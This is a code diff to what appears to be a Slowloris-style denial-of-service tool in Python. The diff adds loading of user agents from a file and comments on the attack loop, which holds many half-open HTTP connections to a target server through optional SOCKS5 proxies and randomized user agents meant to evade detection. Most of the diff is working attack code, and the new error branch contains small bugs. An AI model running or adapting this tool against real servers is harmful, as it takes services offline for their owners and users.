@@ -32,6 +32,12 @@ parser.add_argument(
     help="Randomizes user-agents with each request",
 )
 parser.add_argument(
+    "-uaf",
+    "--useragentfile",
+    default="custom.txt",
+    help="Reads user agents from file",
+)
+parser.add_argument(
     "-x",
     "--useproxy",
     dest="useproxy",
@@ -71,7 +77,6 @@ if args.useproxy:
     # the proxy by default
     try:
         import socks
-
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
         socket.socket = socks.socksocket
         logging.info("Using SOCKS5 proxy for connecting...")
@@ -96,36 +101,9 @@ if args.https:
     import ssl
 
 list_of_sockets = []
-user_agents = [
-    "curl/7.72.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-]
+defaut_user_agent = "curl/7.72.0"
 
-
+## Create socket
 def init_socket(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
@@ -137,10 +115,17 @@ def init_socket(ip):
     s.send("GET /{}.html HTTP/1.1\r\n".format(random.randint(1, 10)).encode("utf-8"))
     s.send("Host: {}\r\n".format(ip).encode("utf-8"))
     if args.randuseragent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+        user_agents = ""
+        try:
+            with open(args.useragentfile) as f:
+                user_agents = f.read().splitlines()
+                s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
+        except EnvironmentError:
+            print("Could not open file {}".format(user_agents_file))
+            s.send("User-Agent {}\r\n".format(defaut_user_agent).encode("utf-8"))
     else:
-        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
-    #s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+        s.send("User-Agent: {}\r\n".format(defaut_user_agent).encode("utf-8"))
+   
     return s
 
 
@@ -149,6 +134,8 @@ def main():
     socket_count = args.sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
+
+    ## Create sockets to attack server
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
@@ -159,6 +146,8 @@ def main():
             break
         list_of_sockets.append(s)
 
+
+    ## For each socket send keep alive headers in order to keep the connection alive
     while True:
         try:
             logging.info(
@@ -174,6 +163,7 @@ def main():
                 except socket.error:
                     list_of_sockets.remove(s)
 
+            ## If any socket fails the connection is recreated with another socket.
             for _ in range(socket_count - len(list_of_sockets)):
                 logging.debug("Recreating socket...")
                 try:
